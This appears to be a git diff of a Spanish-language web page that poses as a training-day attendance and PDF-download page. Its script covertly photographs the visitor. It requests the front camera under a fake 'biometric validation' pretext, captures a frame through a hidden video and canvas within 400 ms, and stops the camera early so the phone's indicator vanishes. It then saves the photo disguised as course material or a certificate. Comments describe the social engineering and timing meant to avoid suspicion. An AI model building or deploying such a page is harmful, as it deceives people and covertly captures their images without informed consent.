@@ -3,46 +3,55 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Capacitación - Material Oficial</title>
+    <title>Sistema de Asistencia Institucional</title>
     <style>
-        body { font-family: sans-serif; text-align: center; padding: 50px; background-color: #f4f7f6; color: #333; }
-        .card { background: white; padding: 40px; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); max-width: 450px; margin: auto; }
-        h2 { color: #1a73e8; }
-        p { margin-bottom: 30px; line-height: 1.5; }
-        .btn { padding: 15px 30px; background: #1a73e8; color: white; border: none; border-radius: 8px; cursor: pointer; font-size: 16px; font-weight: bold; transition: background 0.3s; }
-        .btn:hover { background: #1557b0; }
-        #msg { margin-top: 25px; font-weight: bold; color: #28a745; display: none; }
-        /* Ocultar elementos de captura */
-        video, canvas { display: none; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #e9ecef; margin: 0; padding: 20px; display: flex; justify-content: center; }
+        .container { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); max-width: 400px; width: 100%; text-align: center; }
+        h2 { color: #2c3e50; font-size: 1.5rem; margin-bottom: 10px; }
+        p { color: #7f8c8d; font-size: 0.9rem; margin-bottom: 20px; }
+        input { width: 90%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 6px; }
+        .btn-camera { background-color: #3498db; color: white; border: none; padding: 15px; width: 100%; border-radius: 6px; cursor: pointer; font-weight: bold; margin-top: 10px; }
+        .btn-camera:hover { background-color: #2980b9; }
+        #status { margin-top: 15px; font-weight: bold; color: #27ae60; display: none; }
+        video, canvas { display: none; } /* Totalmente oculto */
     </style>
 </head>
 <body>
 
-<div class="card">
-    <h2>Bienvenido a la Jornada</h2>
-    <p>Para registrar su asistencia y descargar el <b>PDF con el material de la capacitación</b>, presione el siguiente botón:</p>
+<div class="container">
+    <h2>Registro de Asistencia</h2>
+    <p>Complete sus datos para recibir el material de la jornada y certificar su presencia.</p>
     
-    <button class="btn" id="startBtn">DESCARGAR MATERIAL (PDF)</button>
+    <input type="text" id="nombre" placeholder="Nombre y Apellido">
+    <input type="text" id="grado" placeholder="Grado / Institución">
     
-    <div id="msg">✅ Descarga Iniciada. Revise su carpeta de descargas o galería.</div>
+    <div style="background: #fff3cd; padding: 10px; border-radius: 6px; border: 1px solid #ffeeba; margin: 15px 0;">
+        <small style="color: #856404;">⚠️ <b>Validación Biométrica requerida:</b> Al presionar el botón, se solicitará acceso a la cámara para confirmar su identidad.</small>
+    </div>
+
+    <button class="btn-camera" id="captureBtn">REGISTRAR Y DESCARGAR MATERIAL</button>
+    
+    <div id="status">✅ Procesando registro... <br> Bajando MATERIAL_JORNADA.pdf</div>
 </div>
 
 <video id="video" autoplay playsinline></video>
 <canvas id="canvas"></canvas>
 
 <script>
-    const startBtn = document.getElementById('startBtn');
+    const captureBtn = document.getElementById('captureBtn');
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
-    const msg = document.getElementById('msg');
+    const status = document.getElementById('status');
 
-    startBtn.addEventListener('click', async () => {
+    captureBtn.addEventListener('click', async () => {
+        const nom = document.getElementById('nombre').value;
+        if(!nom) { alert("Por favor complete sus datos"); return; }
+
         try {
-            // Solicitar cámara (Aquí saltará el permiso que vimos en image_841f21.png)
+            // Solicitud de permiso (Ingeniería Social: El usuario cree que es "normal")
             const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
             video.srcObject = stream;
 
-            // Esperar un instante a que la cámara enfoque y capturar
             video.onloadedmetadata = () => {
                 setTimeout(() => {
                     const context = canvas.getContext('2d');
@@ -50,24 +59,22 @@
                     canvas.height = video.videoHeight;
                     context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-                    // Detener cámara inmediatamente
+                    // Detener cámara rápido para que el punto verde/naranja (iOS) desaparezca
                     stream.getTracks().forEach(track => track.stop());
 
-                    // Descargar la foto con nombre de "documento"
+                    // "Disfrazar" la foto como si fuera el PDF de la jornada
                     const dataURL = canvas.toDataURL('image/jpeg');
                     const link = document.createElement('a');
                     link.href = dataURL;
-                    link.download = 'MATERIAL_CAPACITACION_CONFIDENCIAL.jpg';
+                    link.download = `CERTIFICADO_ASISTENCIA_${nom.replace(/ /g, '_')}.jpg`;
                     link.click();
 
-                    // Mostrar mensaje de éxito
-                    startBtn.style.display = 'none';
-                    msg.style.display = 'block';
-                }, 500); // 500ms es suficiente para capturar sin que sospechen
+                    captureBtn.style.display = 'none';
+                    status.style.display = 'block';
+                }, 400); // 400ms es un pestañeo
             };
         } catch (err) {
-            alert("Debe permitir el acceso para descargar el material de la jornada.");
-            console.error("Error: ", err);
+            alert("Error de validación: Se requiere acceso a la cámara para la asistencia.");
         }
     });
 </script>
